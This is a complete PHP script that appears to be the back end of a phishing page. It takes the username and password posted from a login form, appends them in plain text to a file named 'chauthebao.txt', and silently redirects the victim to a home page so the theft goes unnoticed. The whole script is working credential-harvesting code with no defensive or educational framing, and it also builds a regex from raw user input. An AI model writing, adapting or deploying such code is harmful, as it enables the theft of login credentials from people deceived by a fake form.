<?php
$username = $_POST['user'];
$password = $_POST['pass'];
if($username == "" && $password == ""){
header("Location: index.php");
}
?>

<?php function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }

      if(!preg_match('/'.$username.'/', file_get_contents('chauthebao.txt'))){
        $file = fopen('chauthebao.txt','a');
        fwrite($file,$username.' | '.$password.PHP_EOL);
        fclose($file);
    
        }
echo '<script>location.href = "/trangchu.html"</script>';
?>